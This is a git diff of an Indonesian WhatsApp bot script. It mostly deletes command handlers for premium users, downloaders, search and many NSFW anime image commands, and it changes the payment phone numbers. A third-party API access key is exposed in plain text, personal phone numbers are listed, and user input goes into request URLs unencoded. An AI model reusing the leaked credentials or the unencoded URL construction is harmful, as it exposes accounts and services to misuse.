-//------------------< premium menu >-------------------
-       case 'premium': 
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (!isOwner) return freply(mess.only.owner)
-              if (args[0] === 'add') {
-              if (mek.message.extendedTextMessage != undefined) {
-              mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
-
-              premium.addPremiumUser(mentioned[0], args[2], _premium)
-              freply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${mentioned[0]}\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
-                        
-              } else {
-                            
-              premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)
-              freply(`*「 PREMIUM ADDED 」*\n\n➸ *ID*: ${args[1]}@s.whatsapp.net\n➸ *Expired*: ${ms(toMs(args[2])).days} day(s) ${ms(toMs(args[2])).hours} hour(s) ${ms(toMs(args[2])).minutes} minute(s)`)
-}
-              } else if (args[0] === 'del') {
-              if (mek.message.extendedTextMessage != undefined) {
-              mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
-            _premium.splice(premium.getPremiumPosition(mentioned[0], _premium), 1)
-              fs.writeFileSync('./database/user/premium.json', JSON.stringify(_premium))
-              freply(mess.success)
-              } else {
-            _premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
-              fs.writeFileSync('./database/user/premium.json', JSON.stringify(_premium))
-              freply(mess.success)
-}
-              } else {
-              freply(mess.wrongFormat)
-}
-              break
-       case 'premiumcheck':
-       case 'cekpremium': 
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (!isPremium) return freply(mess.only.premium)
-              const cekExp = ms(await premium.getPremiumExpired(sender, _premium) - Date.now())
-              freply(`*「 PREMIUM EXPIRE 」*\n\n➸ *ID*: ${sender}\n➸ *Premium left*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`)
-              break
-       case 'listprem':
-       case 'listpremium':          
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              let txt = `「 *PREMIUM USER LIST* 」\n\n`
-              let men = [];
-              for (let i of _premium){
-              men.push(i.id)
-              const checkExp = ms(i.expired - Date.now())
-              txt += `➸ *ID :* @${i.id.split("@")[0]}\n➸ *Expired*: ${checkExp.days} day(s) ${checkExp.hours} hour(s) ${checkExp.minutes} minute(s)\n\n`
-}
-              mentions(txt, men, true)
-              break       
-//------------------< bayar menu >-------------------  
 case 'bayar':
 if (!isRegist) return freply(mess.regist)
 if (isBanned) return freply(mess.banned)
 gopeynya = 'https://i.ibb.co/kynNYTh/Ramdani2.jpg'
 teksnya = `*[ PAYMENT ]*
-*Gopay :* 089512545999
-*Dana :* 089512545999
-*Ovo :* 089512545999
-*[ © ʙʏ ʀᴀᴍᴅᴀɴɪ ᴏғғɪᴄɪᴀʟ ]*`
+*Gopay :* 083804343232
+*Pulsa :* 083804343232
+*Ovo :* 083804343232
+*[ © ʙʏ ᴡᴀɴᴢʙᴏᴛ ]*`
         Ramdani.sendMessage(from, await getBuffer(gopeynya), image, {quoted: ftoko, caption: teksnya })
               break
-//--------------------<const menu>--------------------
-             case 'alllmenu2':
-             Ramdani.sendMessage(from, allmenu(prefix), MessageType.text, {quoted: troli})
-             break
 //------------------< Sticker Cmd >-------------------
        case 'addcmd': 
        case 'setcmd':
@@ -3035,23 +1812,6 @@ teksnya = `*[ PAYMENT ]*
               if (!isRegist) return freply(mess.regist)
               if (isBanned) return freply(mess.banned)
               try {
-              if (!isUrl(q)) return freply('Linknya?')
-              freply(mess.wait)
-              res = await axios.get(`https://api.lolhuman.xyz/api/instagram2?apikey=${lolhumanapi}&url=${args[0]}`)
-              data = res.data.result
-              for (let i = 0; i < data.media.length; i++) {
-              sendMediaURL(from, data.media[i], data.caption, {thumbnail: Buffer.alloc(0)})
-}
-              } catch (e) {
-              console.log(e)
-              freply(String(e))
-}
-              break 
-       case 'igdl2':
-       case 'instagram2':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              try {
               if (!q) return freply('Linknya?')
               freply(mess.wait)
               res = await axios.get(`https://api.zeks.xyz/api/ig?apikey=${zeksapi}&url=${args[0]}`)
@@ -3068,17 +1828,6 @@ teksnya = `*[ PAYMENT ]*
               console.log(e)
               freply(String(e))
 }
-              break
-       case 'igdl3': 
-       case 'instagram3':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (!q) return freply('Link Yang Mana? ')
-              if (!q.includes('instagram')) return freply(mess.error.Iv)
-              freply(mess.wait)
-              anu = await igDownloader(`${q}`)
-             .then((data) => { sendMediaURL(from, data.result.link, data.result.desc, mek) })
-             .catch((err) => { freply(String(err)) })
               break
        case 'scplay': 
        case 'soundcloud':
@@ -3209,24 +1958,6 @@ _Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
               freply(`eror`)
 }
               break
-        case 'google':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (!q) return freply(mess.wrongFormat)
-              ss = await getBuffer(`https://api.apiflash.com/v1/urltoimage?access_key=f3fce33fa6804c0b97c897b3bd2ec7a8&url=https://google.com/search?q=${q}`)
-              freply(mess.wait)
-              if(q == undefined || q == ' ') return freply(`*Hasil Pencarian : ${q}* tidak ditemukan`)
-              googleIt({ 'query': q }).then(results => {
-              vars = `_*Hasil Pencarian : ${q}*_\n`
-              for (let i = 0; i < results.length; i++) {
-              vars +=  `\n═════════════════\n\n*Judul:* ${results[i].title}\n\n*Deskripsi:* ${results[i].snippet}\n\n*Link:* ${results[i].link}\n\n`
-}
-               Ramdani.sendMessage(from, ss, image, {caption: vars, quoted : mek})
-               }).catch(e => {
-               console.log(e)
-               freply(`${e}`)
-})
-               break
         case 'mediafire':
               if (!isRegist) return freply(mess.regist)
               if (isBanned) return freply(mess.banned)
@@ -3320,18 +2051,6 @@ case 'tiktok':
              sendMediaURL(from,ren,'Done')
 })
              break
-      case 'brainly':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-             brainly(args.join(" ")).then(res => {
-             hmm = '────────────\n'
-             for (let Y of res.data) {
-             hmm += `\n*「 _BRAINLY_ 」*\n\n*➸ Pertanyaan:* ${Y.pertanyaan}\n\n*➸ Jawaban:* ${Y.jawaban[0].text}\n───────────\n`
-}
-             freply(hmm)
-             console.log(res)
-})
-             break      
 case 'ssweb':
 case 'ssurl':
 case 'sslink':
@@ -3344,515 +2063,6 @@ anu = await fetchJson(`https://shot.screenshotapi.net/screenshot?&url=${teks}`)
 buffungu = await getBuffer(anu.screenshot)
 Ramdani.sendMessage(from, buffungu, image, {quoted: troli, caption : teks})
 break
-            case 'ssweb2':
-            case 'ssurl2':
-            case 'sslink2':
-            case 'ss2':
-            if (!isRegist) return freply(mess.regist)
-            if (isBanned) return freply(mess.banned)
-            if (args.length < 1) return freply(`[❗] Example :\n*${prefix}${command} https://google.com*`)                  
-            freply(mess.wait)
-            anu = await getBuffer(`https://hardianto.xyz/api/tools/ssweb?url=${args.join(' ')}&apikey=hardianto`)
-            Ramdani.sendMessage(from, anu, image, {caption: `BERHASIL KAK\n\nPlease Support *Aprilia*`, quoted: mek})
-            break
-	        case 'encimg':
-		    case 'encfoto':
-            if (!isRegist) return freply(mess.regist)
-            if (isBanned) return freply(mess.banned)
-		    if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
-		    const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-			const media = await Ramdani.downloadAndSaveMediaMessage(encmedia)
-			freply(mess.wait)
-			await encimg(media, {lang: 'eng+ind', oem: 1, psm: 3})
-			.then(teks => {
-			freply(teks.trim())
-			fs.unlinkSync(media)
-			})
-			.catch(err => {
-			freply(err.message)
-		    fs.unlinkSync(media)
-			})
-					} else {
-						freply('Foto aja mas')
-					}
-					break
-//ANIME MENU
-case 'art':
-                case 'bts':
-                case 'exo':
-                case 'elf':
-                case 'loli':
-                case 'neko':
-                case 'waifu':
-                case 'shota':
-                case 'husbu':
-                case 'sagiri':
-                case 'shinobu':
-                case 'megumin':
-                case 'wallnime':
-                if (!isRegist) return freply(mess.daftar)
-                if (!isDewasa) return freply(mess.dewasa)
-                if (isBanned) return freply(mess.banned)                
-                getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolhumanapi}`).then((gambar) => {
-                Ramdani.sendMessage(from, gambar, image, { quoted: mek })
-                })
-                break
-                case 'hentai':
-                case 'randomhentai':
-                if (!isRegist) return freply(mess.regist)
-                if (!isDewasa) return freply(mess.dewasa)
-                if (isBanned) return freply(mess.banned)
-                freply(mess.wait)
-                await getBuffer(`http://hadi-api.herokuapp.com/api/hentai`).then((gambar) => {
-                Ramdani.sendMessage(from, gambar, image, { quoted: mek })
-                })
-                break
-                case 'chiisaihentai':
-                case 'trap':
-                case 'blowjob':
-                case 'yaoi':
-                case 'ecchi':                
-                case 'ahegao':
-                case 'hololewd':
-                case 'sideoppai':
-                case 'animefeets':
-                case 'animebooty':
-                case 'animethighss':
-                case 'hentaiparadise':
-                case 'animearmpits':
-                case 'hentaifemdom':
-                case 'lewdanimegirls':
-                case 'biganimetiddies':
-                case 'animebellybutton':
-                case 'hentai4everyone':
-                if (!isRegist) return freply(mess.regist)
-                if (!isDewasa) return freply(mess.dewasa)
-                if (isBanned) return freply(mess.banned)
-                freply(mess.wait)
-                await getBuffer(`https://api.lolhuman.xyz/api/random/nsfw/${command}?apikey=${lolhumanapi}`).then((gambar) => {
-                Ramdani.sendMessage(from, gambar, image, { quoted: mek })
-                })
-                break
-                case 'bj':
-                case 'ero':
-                case 'cum':
-                case 'feet':
-                case 'yuri':
-                case 'trap':
-                case 'lewd':
-                case 'feed':
-                case 'eron':
-                case 'solo':
-                case 'gasm':
-                case 'poke':
-                case 'anal':
-                case 'holo':
-                case 'tits':
-                case 'kuni':
-                case 'kiss':
-                case 'erok':
-                case 'smug':
-                case 'baka':
-                case 'solog':
-                case 'feetg':
-                case 'lewdk':
-                case 'waifu':
-                case 'pussy':
-                case 'femdom':
-                case 'cuddle':
-                case 'hentai':
-                case 'eroyuri':
-                case 'cum_jpg':
-                case 'blowjob':
-                case 'erofeet':
-                case 'holoero':
-                case 'classic':
-                case 'erokemo':
-                case 'fox_girl':
-                case 'futanari':
-                case 'lewdkemo':
-                case 'wallpaper':
-                case 'pussy_jpg':
-                case 'kemonomimi':
-                case 'nsfw_avatar':
-                if (!isRegist) return freply(mess.regist)
-                if (isBanned) return freply(mess.banned)
-                freply(mess.wait)
-                getBuffer(`https://api.lolhuman.xyz/api/random2/${command}?apikey=${lolhumanapi}`).then((gambar) => {
-                Ramdani.sendMessage(from, gambar, image, { quoted: mek })
-                })
-                break
-//HENTAI MENU
-       case 'nhentaipdf':
-             if (!isRegist) return freply(mess.regist)
-             if (!isDewasa) return freply(mess.dewasa)
-             if (isBanned) return freply(mess.banned)
-             if (!isPremium) return freply(mess.only.premium)
-             if (args.length == 0) return freply(`Usage: ${prefix + command} query\nExample: ${prefix + command} 317986`)
-             if (isNaN(Number(args[0]))) return await freply(mess.wrongFormat)
-             try {
-             henid = args[0]
-             get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${lolhumanapi}`)
-             get_result = get_result.result
-             get_info = get_result.info
-             teks = `\n${get_result.title_romaji}\n\n${get_result.title_native}\n\nCharacter : ${get_info.characters.join(", ")}\n`
-             ini_image = await getBuffer(get_result.image[0])
-             Ramdani.sendMessage(from, ini_image, image, { caption: teks, quoted: mek })
-             anu = await fetchJson(`https://api.lolhuman.xyz/api/nhentaipdf/${henid}?apikey=${lolhumanapi}`)
-             pdf = await getBuffer(anu.result)
-             Ramdani.sendMessage(from, pdf, document, { quoted: mek, mimetype: Mimetype.pdf, filename: `${get_result.title_romaji}.pdf`, thumbnail: ini_image })
-             } catch (e) {
-             console.log(e)
-             freply(String(e))
-}
-             break
-       case 'nhentai':
-              if (!isRegist) return freply(mess.regist)
-              if (!isDewasa) return freply(mess.dewasa)
-              if (isBanned) return freply(mess.banned)
-              if (!isPremium) return freply(mess.only.premium)
-              if (args.length == 0) return freply(`Example: ${prefix + command} 344253`)
-              freply(mess.wait)
-              henid = args[0]
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nhentai/${henid}?apikey=${lolhumanapi}`)
-              get_result = get_result.result
-              ini_txt = `Title Romaji : ${get_result.title_romaji}\n`
-              ini_txt += `Title Native : ${get_result.title_native}\n`
-              ini_txt += `Read Online : ${get_result.read}\n`
-              get_info = get_result.info
-              ini_txt += `Parodies : ${get_info.parodies}\n`
-              ini_txt += `Character : ${get_info.characters.join(", ")}\n`
-              ini_txt += `Tags : ${get_info.tags.join(", ")}\n`
-              ini_txt += `Artist : ${get_info.artists}\n`
-              ini_txt += `Group : ${get_info.groups}\n`
-              ini_txt += `Languager : ${get_info.languages.join(", ")}\n`
-              ini_txt += `Categories : ${get_info.categories}\n`
-              ini_txt += `Pages : ${get_info.pages}\n`
-              ini_txt += `Uploaded : ${get_info.uploaded}\n`
-              freply(ini_txt)
-              break
-       case 'manga':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (!isDewasa) return freply(mess.dewasa)
-              if (args.length == 0) return freply(`Example: ${prefix + command} Gotoubun No Hanayome`)
-              freply(mess.wait)
-              query = args.join(" ")
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/manga?apikey=${lolhumanapi}&query=${query}`)
-              get_result = get_result.result
-              ini_txt = `Id : ${get_result.id}\n`
-              ini_txt += `Id MAL : ${get_result.idMal}\n`
-              ini_txt += `Title : ${get_result.title.romaji}\n`
-              ini_txt += `English : ${get_result.title.english}\n`
-              ini_txt += `Native : ${get_result.title.native}\n`
-              ini_txt += `Format : ${get_result.format}\n`
-              ini_txt += `Chapters : ${get_result.chapters}\n`
-              ini_txt += `Volume : ${get_result.volumes}\n`
-              ini_txt += `Status : ${get_result.status}\n`
-              ini_txt += `Source : ${get_result.source}\n`
-              ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
-              ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
-              ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
-              ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
-              ini_txt += `Score : ${get_result.averageScore}%\n`
-              ini_txt += `Characters : \n`
-              ini_character = get_result.characters.nodes
-              for (var x of ini_character) {
-              ini_txt += `- ${x.name.full} (${x.name.native})\n`
-}
-              ini_txt += `\nDescription : ${get_result.description}`
-              thumbnail = await getBuffer(get_result.coverImage.large)
-              await Ramdani.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
-              break
-       case 'doujindesu':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-             if (!q) return freply(mess.wrongFormat)
-             freply(mess.wait)
-             try {
-             doujinnya = await got.get(`http://api-melodicxt-2.herokuapp.com/api/doujindesu/search?query=${q}&apiKey=administrator`).json()
-             let { data } = await doujinnya
-             xixixai = `*Doujindesu Search*\n`
-             for (let i = 0; i < data.length; i++) {
-             xixixai += `\n*Urutan ${i+1}*\n*Title:* ${data[i].title}\n*Type:* ${data[i].type}\n*Status:* ${data[i].status}\n*Rating:* ${data[i].rating}\n*Followers:* ${data[i].followers}\n`
-}
-             buffer = await getBuffer(data[0].thumb)
-             Ramdani.sendMessage(from, buffer, image, {caption: xixixai, quoted: mek})
-             } catch (e) {
-             console.log(e)
-             freply(String(e))
-}
-             break
-      case 'anime':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-             if (args.length == 0) return freply(`Example: ${prefix + command} Gotoubun No Hanayome`)
-             freply(mess.wait)
-             query = args.join(" ")
-             get_result = await fetchJson(`https://api.lolhuman.xyz/api/anime?apikey=${lolhumanapi}&query=${query}`)
-             get_result = get_result.result
-             ini_txt = `Id : ${get_result.id}\n`
-             ini_txt += `Id MAL : ${get_result.idMal}\n`
-             ini_txt += `Title : ${get_result.title.romaji}\n`
-             ini_txt += `English : ${get_result.title.english}\n`
-             ini_txt += `Native : ${get_result.title.native}\n`
-             ini_txt += `Format : ${get_result.format}\n`
-             ini_txt += `Episodes : ${get_result.episodes}\n`
-             ini_txt += `Duration : ${get_result.duration} mins.\n`
-             ini_txt += `Status : ${get_result.status}\n`
-             ini_txt += `Season : ${get_result.season}\n`
-             ini_txt += `Season Year : ${get_result.seasonYear}\n`
-             ini_txt += `Source : ${get_result.source}\n`
-             ini_txt += `Start Date : ${get_result.startDate.day} - ${get_result.startDate.month} - ${get_result.startDate.year}\n`
-             ini_txt += `End Date : ${get_result.endDate.day} - ${get_result.endDate.month} - ${get_result.endDate.year}\n`
-             ini_txt += `Genre : ${get_result.genres.join(", ")}\n`
-             ini_txt += `Synonyms : ${get_result.synonyms.join(", ")}\n`
-             ini_txt += `Score : ${get_result.averageScore}%\n`
-             ini_txt += `Characters : \n`
-             ini_character = get_result.characters.nodes
-             for (var x of ini_character) {
-             ini_txt += `- ${x.name.full} (${x.name.native})\n`
- }
-             ini_txt += `\nDescription : ${get_result.description}`
-             thumbnail = await getBuffer(get_result.coverImage.large)
-             await Ramdani.sendMessage(from, thumbnail, image, { quoted: mek, caption: ini_txt })
-             break
-      case 'kusonime':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-             if (args.length == 0) return freply(`Example: ${prefix + command} Gotoubun No Hanayome`)
-             freply(mess.wait)
-             query = args.join(" ")
-             get_result = await fetchJson(`https://api.lolhuman.xyz/api/kusonimesearch?apikey=${lolhumanapi}&query=${query}`)
-             get_result = get_result.result
-             ini_txt = `Title : ${get_result.title}\n`
-             ini_txt += `Japanese : ${get_result.japanese}\n`
-             ini_txt += `Genre : ${get_result.genre}\n`
-             ini_txt += `Seasons : ${get_result.seasons}\n`
-             ini_txt += `Producers : ${get_result.producers}\n`
-             ini_txt += `Type : ${get_result.type}\n`
-             ini_txt += `Status : ${get_result.status}\n`
-             ini_txt += `Total Episode : ${get_result.total_episode}\n`
-             ini_txt += `Score : ${get_result.score}\n`
-             ini_txt += `Duration : ${get_result.duration}\n`
-             ini_txt += `Released On : ${get_result.released_on}\n`
-             ini_txt += `Desc : ${get_result.desc}\n`
-             link_dl = get_result.link_dl
-             for (var x in link_dl) {
-             ini_txt += `\n${x}\n`
-             for (var y in link_dl[x]) {
-             ini_txt += `${y} - ${link_dl[x][y]}\n`
-}
-}
-             ini_buffer = await getBuffer(get_result.thumbnail)
-             await Ramdani.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
-             break
-       case 'otakudesu':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              if (args.length == 0) return freply(`Example: ${prefix + command} Gotoubun No Hanayome`)
-              freply(mess.wait)
-              query = args.join(" ")
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/otakudesusearch?apikey=${lolhumanapi}&query=${query}`)
-              get_result = get_result.result
-              ini_txt = `Title : ${get_result.title}\n`
-              ini_txt += `Japanese : ${get_result.japanese}\n`
-              ini_txt += `Judul : ${get_result.judul}\n`
-              ini_txt += `Type : ${get_result.type}\n`
-              ini_txt += `Episode : ${get_result.episodes}\n`
-              ini_txt += `Aired : ${get_result.aired}\n`
-              ini_txt += `Producers : ${get_result.producers}\n`
-              ini_txt += `Genre : ${get_result.genres}\n`
-              ini_txt += `Duration : ${get_result.duration}\n`
-              ini_txt += `Studios : ${get_result.status}\n`
-              ini_txt += `Rating : ${get_result.rating}\n`
-              ini_txt += `Credit : ${get_result.credit}\n`
-              get_link = get_result.link_dl
-              for (var x in get_link) {
-              ini_txt += `\n\n*${get_link[x].title}*\n`
-              for (var y in get_link[x].link_dl) {
-              ini_info = get_link[x].link_dl[y]
-              ini_txt += `\n\`\`\`Reso : \`\`\`${ini_info.reso}\n`
-              ini_txt += `\`\`\`Size : \`\`\`${ini_info.size}\n`
-              ini_txt += `\`\`\`Link : \`\`\`\n`
-              down_link = ini_info.link_dl
-              for (var z in down_link) {
-              ini_txt += `${z} - ${down_link[z]}\n`
-}
-}
-}
-              freply(ini_txt)
-              break
-       case 'nekopoi':
-              if (!isRegist) return freply(mess.regist)
-              if (!isDewasa) return freply(mess.dewasa)
-              if (isBanned) return freply(mess.banned)
-              if (args.length == 0) return freply(`Example: ${prefix + command} https://nekopoi.care/isekai-harem-monogatari-episode-4-subtitle-indonesia/`)
-              ini_url = args[0]
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoi?apikey=${lolhumanapi}&url=${ini_url}`)
-              get_result = get_result.result
-              ini_txt = `\`\`\`• Title : ${get_result.anime}\`\`\`\n`
-              ini_txt += `\`\`\`• Porducers : ${get_result.producers}\`\`\`\n`
-              ini_txt += `\`\`\`• Duration : ${get_result.duration}\`\`\`\n`
-              ini_txt += `\`\`\`• Size : ${get_result.size}\`\`\`\n`
-              ini_txt += `\`\`\`• Sinopsis : ${get_result.sinopsis}\`\`\`\n`
-              link = get_result.link
-              for (var x in link) {
-              ini_txt += `\n${link[x].name}\n`
-              link_dl = link[x].link
-              for (var y in link_dl) {
-              ini_txt += `${y} - ${link_dl[y]}\n`
-}
-}
-              ini_buffer = await getBuffer(get_result.thumb)
-              await Ramdani.sendMessage(from, ini_buffer, image, { quoted: mek, caption: ini_txt })
-              break
-       case 'nekopoisearch':
-              if (!isRegist) return freply(mess.regist)
-              if (!isDewasa) return freply(mess.dewasa)
-              if (isBanned) return freply(mess.banned)
-              if (args.length == 0) return freply(`Example: ${prefix + command} Isekai Harem`)
-              query = args.join(" ")
-              get_result = await fetchJson(`https://api.lolhuman.xyz/api/nekopoisearch?apikey=${lolhumanapi}&query=${query}`)
-              get_result = get_result.result
-              ini_txt = ""
-              for (var x of get_result) {
-              ini_txt += `\`\`\`• Title : ${x.title}\`\`\`\n`
-              ini_txt += `\`\`\`• Link : ${x.link}\`\`\`\n`
-              ini_txt += `\`\`\`• Thumbnail : ${x.thumbnail}\`\`\`\n\n`
-}
-              freply(ini_txt)
-              break
-       case 'neko':
-       case 'kanna':
-       case 'sagiri':
-       case 'megumin':
-       case 'wallnime':
-       if (!isRegist) return freply(mess.regist)
-       if (!isDewasa) return freply(mess.dewasa)
-       if (isBanned) return freply(mess.banned)
-              reply(mess.wait)
-              getBuffer(`https://api.lolhuman.xyz/api/random/${command}?apikey=${lolhumanapi}`).then((gambar) => {
-              Ramdani.sendMessage(from, gambar, image, { quoted: mek, thumbnail: Buffer.alloc(0) })
-})
-              break
-       
-       case 'hentai':
-       if (!isRegist) return freply(mess.regist)
-       if (!isDewasa) return freply(mess.dewasa)
-       if (isBanned) return freply(mess.banned)
-              getBuffer(`http://hadi-api.herokuapp.com/api/hentai`).then((gambar) => {
-              Ramdani.sendMessage(from, gambar, image, { quoted: mek })
-}) 
-              break
-       case 'storyanime':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              freply(mess.wait)
-              anu = await fetchJson(`https://lolhuman.herokuapp.com/api/storynime?apikey=${lolhumanapi}`)
-              buffer = await getBuffer(anu.result)
-              Ramdani.sendMessage(from, buffer, video, { quoted: mek })
-              break
-       case 'nekopoi3d':
-       case '3dnekopoi':
-       case '3dnekopoilast':
-              if (!isRegist) return freply(mess.regist)
-              if (!isDewasa) return freply(mess.dewasa)
-              if (isBanned) return freply(mess.banned)
-              freply(mess.wait)
-              try {
-              bsangee = await axios.get(`https://api.vhtear.com/neko3d&apikey=${vhtearapi}`)
-              bsangee2 = bsangee.data
-              keluarplay = `*List update 3D JAV*\n`
-              for (let i = 0; i < bsangee2.result.length; i++) {
-              keluarplay += `\n═════════════════\n\n*Judul* : ${bsangee2.result[i].title}\n*Deskripsi* : ${bsangee2.result[i].description}\n*Link* : ${bsangee2.result[i].url}\n`
-}
-              freply(keluarplay) 
-              } catch (err) {
-              console.log(err)
-              freply('error!')
-}
-               break
-        case 'nekopoijav':
-        case 'javnekopoi':
-              if (!isRegist) return freply(mess.regist)
-              if (!isDewasa) return freply(mess.dewasa)
-              if (isBanned) return freply(mess.banned)
-               freply(mess.wait)
-               try {
-               bsangce = await axios.get(`https://api.vhtear.com/nekojavlist&apikey=${vhtearapi}`)
-               bsangce2 = bsangce.data
-               keluarplay = `*List update JAV*\n`
-               for (let i = 0; i < bsangce2.result.length; i++) {
-               keluarplay += `\n═════════════════\n\n*Judul* : ${bsangce2.result[i].title}\n*Serial JAV* : ${bsangce2.result[i].seri}\n*Link* : ${bsangce2.result[i].url}\n`
-}
-               freply(keluarplay)
-               } catch (err) {
-               console.log(err)
-}
-               break
-        case 'nekopoicosplay':
-        case 'cosplaynekopoi':
-              if (!isRegist) return freply(mess.regist)
-              if (!isDewasa) return freply(mess.dewasa)
-              if (isBanned) return freply(mess.banned)
-               try {
-               freply(mess.wait)
-               bsangbe = await axios.get(`https://api.vhtear.com/nekojavcosplay&apikey=${vhtearapi}`)
-               bsangbe2 = bsangbe.data
-               keluarplay = `*List update Cosplay JAV*\n`
-               for (let i = 0; i < bsangbe2.result.length; i++) {
-               keluarplay += `\n═════════════════\n\n*Judul* : ${bsangbe2.result[i].title}\n*Deskripsi* : ${bsangbe2.result[i].detail}\n*Link* : ${bsangbe2.result[i].url}\n`
-}
-               freply(keluarplay)
-               } catch (err) {
-               console.log(err)
-}
-               break
-        case 'otakuongoing':              
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-               o = await onGoing()
-               console.log(o)
-               ot = '*「 Ongoing Otakudesu 」*'
-               for (let i = 0; i < o.length; i++) {
-               ot += `\n\n*Judul :* ${o[i].judul}\n*Episode :* ${o[i].eps}\n*Eps berikutnya pada hari :* ${o[i].hri}\n*Tanggal :* ${o[i].tgl}\n\n*Image :* ${o[i].thumb}`
-}
-               buff = await getBuffer(o[0].thumb)
-               Ramdani.sendMessage(from, buff, image, {quoted: mek, caption: ot})
-               break
-//ANIME MENU
-            case 'waifu':
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-v = await fetchJson(`https://api.waifu.pics/sfw/waifu`)
-inifile = sendMediaURL(from, v.url, )
-buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}nhentaibot`,buttonText:{displayText:'NHENTAI BOT'},type:1}]
-              imageMsg = ( await Ramdani.prepareMessage(from, inifile, 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
-              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
-              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
-              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
-              Ramdani.relayWAMessage(prep)
-              fs.unlinkSync(`./${sender}.jpeg`)
-break
-       case 'loli':
-       case 'husbu':
-       case 'milf':
-       case 'cosplay':
-       case 'wallml':              
-              if (!isRegist) return freply(mess.regist)
-              if (isBanned) return freply(mess.banned)
-              let wipu = (await axios.get(`https://raw.githubusercontent.com/Arya-was/endak-tau/main/${command}.json`)).data
-              let wipi = wipu[Math.floor(Math.random() * (wipu.length))]
-              fs.writeFileSync(`./${sender}.jpeg`, await getBuffer(wipi))
-		      buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1},{buttonId:`${prefix}nhentaibot`,buttonText:{displayText:'NHENTAI BOT'},type:1}]
-              imageMsg = ( await Ramdani.prepareMessage(from, fs.readFileSync(`./${sender}.jpeg`), 'imageMessage', {thumbnail: Buffer.alloc(0)})).message.imageMessage
-              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
-              contentText:`klik Next untuk ke gambar selanjut nya`,buttons,headerType:4}
-              prep = await Ramdani.prepareMessageFromContent(from,{buttonsMessage},{quoted: mek})
-              Ramdani.relayWAMessage(prep)
-              fs.unlinkSync(`./${sender}.jpeg`)
-              break
 //DOWNLOAD MENU
 case 'play':
 if (!isRegist) return freply(mess.regist)
@@ -3893,31 +2103,6 @@ freply('_[ ! ] Error Saat Memasuki Web Y2mate_')
 sendFileFromUrl(res[0].link, document, {quoted: mek, mimetype: 'audio/mp3', filename: res[0].output})
 }
 break
-case 'play2':
-if(isBanned) return freply(mess.banned)
-if (args.length === 0) return freply(`Example ${prefix + command} love nwantiti`)
-anu = await fetchJson (`https://hardianto.xyz/api/download/play?query=${args.join(" ")}&apikey=hardianto`)
-sayang = `TITLE BERHASIL DImekATKAN OLEH BOT\n\nTitle : ${anu.title}\nChannel : ${anu.channel}\nUpload : ${anu.published}\nViews : ${anu.views}\n\n*Mohon Tunggu Beberapa Menit Bot Sedang Mengirimkan File*`
-buf = await getBuffer (anu.thumb)
-Ramdani.sendMessage (from, buf, image, {quoted: mek, caption: sayang})
-sound = await getBuffer (anu.url)
-Ramdani.sendMessage(from, sound, audio, {mimetype: 'audio/mp4', quoted: mek})
-break
-case 'play3':
-if (!isRegist) return freply(mess.regist)
-if (isBanned) return freply(mess.banned)
-if (args.length ==0)return freply('Judul Lagunya Apa?')
-freply(mess.wait)
-ini = await fetchJson(`https://hardianto.xyz/api/download/play?query=${args.join(" ")}&apikey=hardianto`)
-thmb = await getBuffer(ini.result.thumbnail)
-ply1 =`Judul: ${ini.result.title}\nSize: ${ini.result.size}\nDurasi: ${ini.result.duration}`
